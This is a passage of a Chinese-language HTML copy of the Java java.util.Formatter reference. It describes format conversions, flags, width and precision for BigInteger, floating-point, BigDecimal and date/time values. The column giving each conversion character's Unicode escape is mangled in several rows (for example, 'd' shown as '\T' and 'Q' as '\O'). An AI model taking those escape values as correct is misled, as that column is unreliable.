><CODE>IllegalFormatPrecisionException</CODE></A>。   </P><P><A rel="nofollow" ><B>BigInteger </B></A>  </P><P>以下转换可应用于 <A title="java.math &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/math/BigInteger.html"  ><CODE>BigInteger</CODE></A>。   <TABLE cellPadding="5" summary="BIntConv" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'d'</TT>   </TD><TD vAlign="top" ><TT>'\T'</TT>   </TD><TD>要求将输出格式化为十进制整数。应用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>。   <P>如果给出 <TT>'#'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'o'</TT>   </TD><TD vAlign="top" ><TT>'\o'</TT>   </TD><TD>要求将输出格式化为以 8 为基数的整数。不应用本地化。   <P>如果 <I>x</I> 为负，那么结果将是以 <TT>'-'</TT> (<TT>'\-'</TT>) 开始的有符号值。允许对这种类型使用有符号输出，因为它不同于基本类型，在没有假定显式数据类型大小的情况下，不可能创建无符号的等效值。   </P><P>如果 <I>x</I> 为正数或零，且给出了 <TT>'+'</TT> 标志，那么结果是以 <TT>'+'</TT> (<TT>'\+'</TT>) 开始的。   </P><P>如果给出 <TT>'#'</TT> 标志，那么输出将始终以 <TT>'0'</TT> 前缀开始。   </P><P>如果给出 <TT>'0'</TT> 标志，那么将使用前导零填充输出，这些零被填充到指示符后的字段宽度中。   </P><P>如果给出 <TT>','</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'x'</TT>   </TD><TD vAlign="top" ><TT>'\x'</TT>   </TD><TD>要求将输出格式化为以 16 为基数的整数。不应用本地化。   <P>如果 <I>x</I> 为负，那么结果是以 <TT>'-'</TT> (<TT>'_apos;</TT>) 开始的有符号值。此类型允许使用有符号输出，因为与基本类型不同，如果不假定明确的数据类型大小，则不可能创建无符号的等效数。   </P><P>如果 <I>x</I> 为正数或零，且给出了 <TT>'+'</TT> 标志，那么结果以 <TT>'+'</TT> (<TT>'\+'</TT>) 开始。   </P><P>如果给出 <TT>'#'</TT> 标志，那么输出将始终以基数指示符 <TT>'0x'</TT> 开始。   </P><P>如果给出 <TT>'0'</TT> 标志，那么将使用前导零填充输出，这些零被填充到基数指示符或符号（如果存在）后面的字段宽度中。   </P><P>如果给出 <TT>','</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'X'</TT>   </TD><TD vAlign="top" ><TT>'\X'</TT>   </TD><TD><TT>'x'</TT> 的大写形式。将表示数字的整个字符串转换为<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/String.html#toUpperCase(java.util.Locale)"  >大写</A>，其中包括 <TT>'x'</TT>（如果有的话）和所有十六进制数字 <TT>'a'</TT> - <TT>'f'</TT> (<TT>'\a'</TT> - <TT>'\f'</TT>)。 </TD></TR></TR></TR></TR></TABLE>  </P><P>如果该转换是 <TT>'o'</TT>、<TT>'x'</TT> 或 <TT>'X'</TT>，并且给出了 <TT>'#'</TT> 和 <TT>'0'</TT> 标志，那么结果将包含基数指示符（对于八进制是 <TT>'0'</TT>，对于十六进制是 <TT>'0'</TT> 或 <TT>"0x"</TT>）、一定数量的零（基于宽度）和该值。   </P><P>如果给出 <TT>'0'</TT> 标志，并且值为负，则在符号后填充零。   </P><P>如果没有给出 <TT>'-'</TT> 标志，则在符号前填充空格。   </P><P>应用为 Byte、Short、Integer 和 Long 定义的所有<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#intFlags"  >标志</A>。没有给出标志时的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#intdFlags"  >默认行为</A>与 Byte、Short、Integer 和 Long 的行为相同。   </P><P><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#intWidth"  >宽度</A>的规范与为 Byte、Short、Integer 和 Long 定义的规范相同。   </P><P>精度不适用。如果指定精度，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/IllegalFormatPrecisionException.html"  ><CODE>IllegalFormatPrecisionException</CODE></A>。   </P><P><A rel="nofollow" ><B>Float 和 Double</B></A><A rel="nofollow">   </A></P><P>以下转换可应用于 <TT>float</TT>、<A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Float.html"  ><CODE>Float</CODE></A>、<TT>double</TT> 和 <A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Double.html"  ><CODE>Double</CODE></A>。   <TABLE cellPadding="5" summary="floatConv" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'e'</TT>   </TD><TD vAlign="top" ><TT>'\e'</TT>   </TD><TD>要求使用<A rel="nofollow" >科学记数法</A>来格式化输出。应用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>。   <P>数值 <I>m</I> 的格式取决它的值。   </P><P>如果 <I>m</I> 是 NaN 或无穷大，则分别输出文本字符串 "NaN" 或 "Infinity"。这些值都没有被本地化。   </P><P>如果 <I>m</I> 是正零或负零，则指数将是 <TT>"+00"</TT>。   </P><P>否则，结果是表示变量的符号和大小（绝对值）的字符串。符号的格式在<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>中已经描述。数值 <I>m</I> 的格式取决它的值。   </P><P>让 <I>n</I> 成为满足 10<SUP><I>n</I></SUP> &lt;= <I>m</I> &lt; 10<SUP><I>n</I>+1</SUP> 的惟一整数；让 <I>a</I> 成为 <I>m</I> 和 10<SUP><I>n</I></SUP> 的精确算术商数值，且满足 1 &lt;= <I>a</I> &lt; 10。然后将该数值解释为 <I>a</I> 的整数部分，因为是一个小数位数，所以后面跟着小数点分隔符，再后面是表示 <I>a</I> 的小数部分的小数位数，后跟指数符号 <TT>'e'</TT> (<TT>'\e'</TT>)，这之后是指数符号，后跟十进制整数形式表示的 <I>n</I>，它由方法 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Long.html#toString(long, int)"  ><CODE>Long.toString(long, int)</CODE></A> 产生，并用零填充，使其至少包括两个位数。   </P><P>在结果中，<I>m</I> 或 <I>a</I> 的小数部分的位数等于精度。如果没有指定精度，则默认值为 <TT>6</TT>。如果精度小于将出现在分别由 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Float.html#toString(float)"  ><CODE>Float.toString(float)</CODE></A> 或 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Double.html#toString(double)"  ><CODE>Double.toString(double)</CODE></A> 返回的字符串中的小数点之后的位数，则使用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/math/BigDecimal.html#ROUND_HALF_UP"  >四舍五入算法</A>对该值进行舍入运算。否则，可能通过追加零来达到所需精度。要获得该值的规范表示形式，请在适当时候使用 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Float.html#toString(float)"  ><CODE>Float.toString(float)</CODE></A> 或 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Double.html#toString(double)"  ><CODE>Double.toString(double)</CODE></A>。   </P><P>如果给出 <TT>','</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'E'</TT>   </TD><TD vAlign="top" ><TT>'\E'</TT>   </TD><TD><TT>'e'</TT> 的大写形式。指数符号将是 <TT>'E'</TT> (<TT>'\E'</TT>)。   </TD><TR>  <TD vAlign="top" ><TT>'g'</TT>   </TD><TD vAlign="top" ><TT>'\g'</TT>   </TD><TD>要求将输出格式化为下面描述的常规科学记数形式。应用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>。   <P>在对精度进行舍入运算后，所得数值 <I>m</I> 的格式取决于它的值。   </P><P>如果 <I>m</I> 大于或等于 10<SUP>-4</SUP> 但小于 10<SUP>精度</SUP>，则以<I><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#decimal"  >十进制形式</A></I> 表示它。   </P><P>如果 <I>m</I> 小于 10<SUP>-4</SUP> 或者大于或等于 10<SUP>精度</SUP>，则以<I><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#scientific"  >计算机科学记数法</A></I> 表示它。   </P><P><I>m</I> 中的总有效位数等于其精度。如果没有指定精度，则其默认值为 <TT>6</TT>。如果精度为 <TT>0</TT>，则该值将为 <TT>1</TT>。   </P><P>如果给出 <TT>'#'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'G'</TT>   </TD><TD vAlign="top" ><TT>'\G'</TT>   </TD><TD><TT>'g'</TT> 的大写形式。   </TD><TR>  <TD vAlign="top" ><TT>'f'</TT>   </TD><TD vAlign="top" ><TT>'\f'</TT>   </TD><TD>要求使用<A rel="nofollow" >十进制形式</A>来格式化输出。使用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>。   <P>结果是表示参数的符号和大小（绝对值）的字符串。符号的格式在<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>中已经描述。数值 <I>m</I> 的格式取决它的值。   </P><P>如果 <I>m</I> 是 NaN 或无穷大，则将分别输出文本字符串 "NaN" 或 "Infinity"。这些值都没有被本地化。   </P><P>将数值格式化为 <I>m</I> 的整数部分（不带前导零），后跟小数点分隔符，再后面是表示 <I>m</I> 的小数部分的一个或多个十进制数字。   </P><P>在结果中，<I>m</I> 或 <I>a</I> 的小数部分的位数等于精度。如果没有指定精度，则默认值为 <TT>6</TT>。如果该精度小于将要出现在分别由 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Float.html#toString(float)"  ><CODE>Float.toString(float)</CODE></A> 或 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Double.html#toString(double)"  ><CODE>Double.toString(double)</CODE></A> 返回的字符串中的小数点之后的位数，则使用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/math/BigDecimal.html#ROUND_HALF_UP"  >四舍五入算法</A>对该值进行舍入运算。否则，可能通过追加零来达到所需精度。要获得该值的规范表示形式，请在适当时候使用 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Float.html#toString(float)"  ><CODE>Float.toString(float)</CODE></A> 或 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Double.html#toString(double)"  ><CODE>Double.toString(double)</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'a'</TT>   </TD><TD vAlign="top" ><TT>'\a'</TT>   </TD><TD>要求将输出格式化为十六进制指数形式。不应用本地化。   <P>结果是表示参数 <I>x</I> 的符号和大小（绝对值）的字符串。   </P><P>如果 <I>x</I> 为负值或负零值，那么结果将以 <TT>'-'</TT> (<TT>'\-'</TT>) 开始。   </P><P>如果 <I>x</I> 为正值或正零值，且给出了 <TT>'+'</TT> 标志，那么结果将以 <TT>'+'</TT> (<TT>'\+'</TT>) 开始。   </P><P>数值 <I>m</I> 的格式取决它的值。   </P><UL>  <LI>如果该值是 NaN 或无穷大，则将分别输出文本字符串 "NaN" 或 "Infinity"。   </LI><LI>如果 <I>m</I> 等于零，则用字符串 <TT>"0x0.0p0"</TT> 表示它。   </LI><LI>如果 <I>m</I> 是具有标准化表现形式的 <TT>double</TT> 值，则用子字符串来表示有效位数和指数字段。有效位数是用字符串 <TT>"0x1."</TT> 表示的，后跟该有效位数小数部分的十六进制表示形式。指数用 <TT>'p'</TT> (<TT>'\p'</TT>) 表示，后跟无偏指数的十进制字符串，该值是对指数值调用 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Integer.html#toString(int)"  ><CODE>Integer.toString</CODE></A> 所产生的。   </LI><LI>如果 <I>m</I> 是具有低正常表现形式的 <TT>double</TT> 值，则用字符 <TT>"0x0."</TT> 表示有效位数，后跟该有效位数小数部分的十六进制表示。用 <TT>'p-1022'</TT> 表示指数。注意，在低正常有效位数中，至少必须有一个非零数字。 </LI></UL>  <P>如果给出 <TT>'('</TT> 或 <TT>','</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'A'</TT>   </TD><TD vAlign="top" ><TT>'\A'</TT>   </TD><TD><TT>'a'</TT> 的大写形式。表示数字的整个字符串将被转换为大写形式，其中包括 <TT>'x'</TT> (<TT>'\x'</TT>) 和 <TT>'p'</TT> (<TT>'\p'</TT> 以及所有的十六进制数字 <TT>'a'</TT> - <TT>'f'</TT> (<TT>'\a'</TT> - <TT>'\f'</TT>)。 </TD></TR></TR></TR></TR></TR></TR></TR></TABLE>  </P><P>应用为 Byte、Short、Integer 和 Long 定义的所有<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#intFlags"  >标志</A>。   </P><P>如果给出 <TT>'#'</TT> 标志，则将始终存在小数点分隔符。 <A rel="nofollow" ></A>  </P><P>如果没有给出标志，则默认格式设置如下：   </P><UL>  <LI><TT>width</TT> 中的输出是右对齐的。   </LI><LI>负数以 <TT>'-'</TT> 开头   </LI><LI>正数和正零不包括符号或额外的前导空格   </LI><LI>不包括组分隔符   </LI><LI>小数点分隔符只在后面有数字时才出现 </LI></UL><A rel="nofollow" ></A>  <P>宽度是将向输出中写入的最少字符数。这包括可应用的所有符号、数字、组分隔符、小数点分隔符、指数符号、基数指示符、圆括号和表示无穷大和 NaN 的字符串。如果转换值的长度小于宽度，则用空格(<TT>'\ '</TT>) 填充输出，直到字符总数等于宽度。默认情况下，在左边进行填充。如果给出 <TT>'-'</TT> 标志，则在右边进行填充。如果没有指定宽度，则没有最小宽度。 <A rel="nofollow" ></A>  </P><P>如果转换是 <TT>'e'</TT>、<TT>'E'</TT> 或 <TT>'f'</TT>，则精度是小数点分隔符后的位数。如果没有指定精度，则假定精度为 <TT>6</TT>。   </P><P>如果转换是 <TT>'g'</TT> 或 <TT>'G'</TT> 转换，那么精度就是舍入运算后所得数值的总有效位数。如果没有指定精度，则默认值为 <TT>6</TT>。如果精度为 <TT>0</TT>，则该值将为 <TT>1</TT>。   </P><P>如果转换是 <TT>'a'</TT> 或 <TT>'A'</TT> 转换，则精度是小数点分隔符后十六进制数字的位数。如果没有提供精度，则将输出 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Double.html#toHexString(double)"  ><CODE>Double.toHexString(double)</CODE></A> 返回的所有数字。   </P><P><A rel="nofollow" ><B>BigDecimal </B></A><A rel="nofollow">  </A></P><P>以下转换可应用于 <A title="java.math &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/math/BigDecimal.html"  ><CODE>BigDecimal</CODE></A>。   <TABLE cellPadding="5" summary="floatConv" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'e'</TT>   </TD><TD vAlign="top" ><TT>'\e'</TT>   </TD><TD>要求使用<A rel="nofollow" >计算机科学记数法</A>对输出进行格式化。应用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>。   <P>数值 <I>m</I> 的格式取决于它的值。   </P><P>如果 <I>m</I> 为正零或负零，则指数将为 <TT>"+00"</TT>。   </P><P>否则，结果是表示参数的符号和大小（绝对值）的字符串。符号的格式在<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>中已经描述。数值 <I>m</I> 的格式取决于它的值。   </P><P>让 <I>n</I> 成为满足 10<SUP><I>n</I></SUP> &lt;= <I>m</I> &lt; 10<SUP><I>n</I>+1</SUP> 的惟一整数；让 <I>a</I> 成为 <I>m</I> 和 10<SUP><I>n</I></SUP> 的精确算术商数值，且满足 1 &lt;= <I>a</I> &lt; 10。然后将该数值解释为 <I>a</I> 的整数部分，因为是一个小数位数，所以后面跟着小数点分隔符，再后面是表示 <I>a</I> 的小数部分的小数位数，后跟指数符号 <TT>'e'</TT> (<TT>'\e'</TT>)，这之后是指数符号，后跟十进制整数形式表示的 <I>n</I>，它由方法 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Long.html#toString(long, int)"  ><CODE>Long.toString(long, int)</CODE></A> 产生，并用零填充，使其至少包括两个位数。   </P><P>在结果中，<I>m</I> 或 <I>a</I> 的小数部分的位数等于精度。如果没有指定精度，则默认值为 <TT>6</TT>。如果精度小于将出现在分别由 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Float.html#toString(float)"  ><CODE>Float.toString(float)</CODE></A> 或 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Double.html#toString(double)"  ><CODE>Double.toString(double)</CODE></A> 返回的字符串中的小数点之后的位数，则使用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/math/BigDecimal.html#ROUND_HALF_UP"  >四舍五入算法</A>对该值进行舍入运算。否则，可能通过追加零来达到所需精度。要获得该值的规范表示形式，请使用 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/math/BigDecimal.html#toString()"  ><CODE>BigDecimal.toString()</CODE></A>。   </P><P>如果给出 <TT>','</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'E'</TT>   </TD><TD vAlign="top" ><TT>'\E'</TT>   </TD><TD><TT>'e'</TT> 的大写形式。指数符号将是 <TT>'E'</TT> (<TT>'\E'</TT>)。   </TD><TR>  <TD vAlign="top" ><TT>'g'</TT>   </TD><TD vAlign="top" ><TT>'\g'</TT>   </TD><TD>要求将输出格式化为下面描述的常规科学记数形式。应用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>。   <P>在对精度进行舍入运算后，所得数值 <I>m</I> 的格式取决于它的值。   </P><P>如果 <I>m</I> 大于或等于 10<SUP>-4</SUP> 但小于 10<SUP>精度</SUP>，则以<I><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#decimal"  >十进制形式</A></I> 表示它。   </P><P>如果 <I>m</I> 小于 10<SUP>-4</SUP> 或者大于或等于 10<SUP>精度</SUP>，则以<I><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#scientific"  >计算机科学记数法</A></I> 表示它。   </P><P><I>m</I> 中的总的有效位数等于精度。如果没有指定精度，则默认值为 <TT>6</TT>。如果精度为 <TT>0</TT>，则该值将为 <TT>1</TT>。   </P><P>如果给出 <TT>'#'</TT> 标志，则将抛出 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/FormatFlagsConversionMismatchException.html"  ><CODE>FormatFlagsConversionMismatchException</CODE></A>。 </P>  </TD><TR>  <TD vAlign="top" ><TT>'G'</TT>   </TD><TD vAlign="top" ><TT>'\G'</TT>   </TD><TD><TT>'g'</TT> 的大写形式。   </TD><TR>  <TD vAlign="top" ><TT>'f'</TT>   </TD><TD vAlign="top" ><TT>'\f'</TT>   </TD><TD>要求使用<A rel="nofollow" >十进制形式</A>来格式化输出。应用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>。   <P>结果是表示参数的符号和大小（绝对值）的字符串。符号的格式在<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#l10n algorithm"  >本地化算法</A>中已经描述。数值 <I>m</I> 的格式取决于它的值。   </P><P>将该数值格式化为 <I>m</I> 的整数部分（不带前导零），后跟小数点分隔符，再后面是表示 <I>m</I> 的小数部分的一个或多个十进制数字。   </P><P>在结果中，<I>m</I> 或 <I>a</I> 的小数部分的位数等于精度。如果没有指定精度，则默认值为 <TT>6</TT>。如果精度小于将出现在分别由 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Float.html#toString(float)"  ><CODE>Float.toString(float)</CODE></A> 或 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Double.html#toString(double)"  ><CODE>Double.toString(double)</CODE></A> 返回的字符串中的小数点之后的位数，则使用<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/math/BigDecimal.html#ROUND_HALF_UP"  >四舍五入算法</A>对该值进行舍入运算。否则，可能通过追加零来达到所需精度。要获得该值的规范表示形式，请使用 <A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/math/BigDecimal.html#toString()"  ><CODE>BigDecimal.toString()</CODE></A>。 </P></TD></TR></TR></TR></TR></TR></TABLE>  </P><P>应用为 Byte、Short、Integer 和 Long 定义的所有<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#intFlags"  >标志</A>。   </P><P>如果给出 <TT>'#'</TT> 标志，则将始终存在小数点分隔符。   </P><P>没有给出标志时的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#floatdFlags"  >默认行为</A>与 Float 和 Double 的行为相同。   </P><P><A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#floatDWidth"  >宽度</A>和<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Formatter.html#floatDPrec"  >精度</A>的规范与为 Float 和 Double 定义的规范相同。 <A rel="nofollow" >  <H4>日期/时间 </H4></A>  </P><P>此转换可应用于 <TT>long</TT>、<A title="java.lang &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/lang/Long.html"  ><CODE>Long</CODE></A>、<A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Calendar.html"  ><CODE>Calendar</CODE></A> 和 <A title="java.util &#20013;&#30340;&#31867;" rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/util/Date.html"  ><CODE>Date</CODE></A>。   <TABLE cellPadding="5" summary="DTConv" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'t'</TT>   </TD><TD vAlign="top" ><TT>'\t'</TT>   </TD><TD>日期和时间转换字符的前缀。   </TD><TR>  <TD vAlign="top" ><TT>'T'</TT>   </TD><TD vAlign="top" ><TT>'\T'</TT>   </TD><TD><TT>'t'</TT> 的大写形式。 </TD></TR></TR></TABLE>  </P><P>以下日期和时间转换字符后缀是为 <TT>'t'</TT> 和 <TT>'T'</TT> 转换定义的。这些类型类似于但不完全等同于 GNU <TT>date</TT> 和 POSIX <TT>strftime(3c)</TT> 定义的那些类型。提供其他转换类型是为了访问特定于 Java 的功能（例如，<TT>'L'</TT> 用于秒中的毫秒）。   </P><P>以下转换字符用来格式化时间：   <TABLE cellPadding="5" summary="time" >  <TBODY>  <TR>  <TD vAlign="top" ><TT>'H'</TT>   </TD><TD vAlign="top" ><TT>'\H'</TT>   </TD><TD>24 小时制的小时，被格式化为必要时带前导零的两位数，即 <TT>00 - 23</TT>。<TT>00</TT> 对应午夜。   </TD><TR>  <TD vAlign="top" ><TT>'I'</TT>   </TD><TD vAlign="top" ><TT>'\I'</TT>   </TD><TD>12 小时制的小时，被格式化为必要时带前导零的两位数，即 <TT>01 - 12</TT>。<TT>01</TT> 对应于 1 点钟（上午或下午）。   </TD><TR>  <TD vAlign="top" ><TT>'k'</TT>   </TD><TD vAlign="top" ><TT>'\k'</TT>   </TD><TD>24 小时制的小时，即 <TT>0 - 23</TT>。<TT>0</TT> 对应于午夜。   </TD><TR>  <TD vAlign="top" ><TT>'l'</TT>   </TD><TD vAlign="top" ><TT>'\l'</TT>   </TD><TD>12 小时制的小时，即 <TT>1 - 12</TT>。<TT>1</TT> 对应于上午或下午的一点钟。   </TD><TR>  <TD vAlign="top" ><TT>'M'</TT>   </TD><TD vAlign="top" ><TT>'\M'</TT>   </TD><TD>小时中的分钟，被格式化为必要时带前导零的两位数，即 <TT>00 - 59</TT>。   </TD><TR>  <TD vAlign="top" ><TT>'S'</TT>   </TD><TD vAlign="top" ><TT>'\S'</TT>   </TD><TD>分钟中的秒，被格式化为必要时带前导零的两位数，即 <TT>00 - 60</TT>（"<TT>60</TT>" 是支持闰秒所需的一个特殊值）。   </TD><TR>  <TD vAlign="top" ><TT>'L'</TT>   </TD><TD vAlign="top" ><TT>'\L'</TT>   </TD><TD>秒中的毫秒，被格式化为必要时带前导零的三位数，即 <TT>000 - 999</TT>。   </TD><TR>  <TD vAlign="top" ><TT>'N'</TT>   </TD><TD vAlign="top" ><TT>'\N'</TT>   </TD><TD>秒中的毫微秒，被格式化为必要时带前导零的九位数，即 <TT>000000000 - 999999999</TT>。此值的精度受基础操作系统或硬件分析的限制。   </TD><TR>  <TD vAlign="top" ><TT>'p'</TT>   </TD><TD vAlign="top" ><TT>'\p'</TT>   </TD><TD>特定于语言环境的<A rel="nofollow" href="http://gceclub.sun.com.cn/Java_Docs/html/zh_CN/api/java/text/DateFormatSymbols.html#getAmPmStrings()"  >上午或下午</A>标记以小写形式表示，例如 "<TT>am</TT>" 或 "<TT>pm</TT>"。使用转换前缀 <TT>'T'</TT> 可以强行将此输出转换为大写形式。（注意，<TT>'p'</TT> 产生的输出是小写的。而 GNU <TT>date</TT> 和 POSIX <TT>strftime(3c)</TT> 产生的输出是大写的。）   </TD><TR>  <TD vAlign="top" ><TT>'z'</TT>   </TD><TD vAlign="top" ><TT>'\z'</TT>   </TD><TD>相对于 GMT 的 <A rel="nofollow" href="http://www.ietf.org/rfc/rfc0822.txt"  >RFC&nbsp;822</A> 格式的数字时区偏移量，例如 <TT>-0800</TT>。   </TD><TR>  <TD vAlign="top" ><TT>'Z'</TT>   </TD><TD vAlign="top" ><TT>'\Z'</TT>   </TD><TD>表示时区的缩写形式的字符串。   </TD><TR>  <TD vAlign="top" ><TT>'s'</TT>   </TD><TD vAlign="top" ><TT>'\s'</TT>   </TD><TD>自协调世界时 (UTC) 1970 年 1 月 1 日 <TT>00:00:00</TT> 至现在所经过的秒数，也就是 <TT>Long.MIN_VALUE/1000</TT> 与 <TT>Long.MAX_VALUE/1000</TT> 之间的差值。   </TD><TR>  <TD vAlign="top" ><TT>'Q'</TT>   </TD><TD vAlign="top" ><TT>'\O'</TT>   </TD><TD>自协调世界时 (UTC) 1970 年 1 月 1 日 <TT>00:00:00</TT> 至现在所经过的毫秒数，即 <TT>Long.MIN_VALUE</TT> 与 <TT>Long.MAX_VALUE</TT> 之间的差值。此值的精度受基础操作系统或硬件分析的限制。 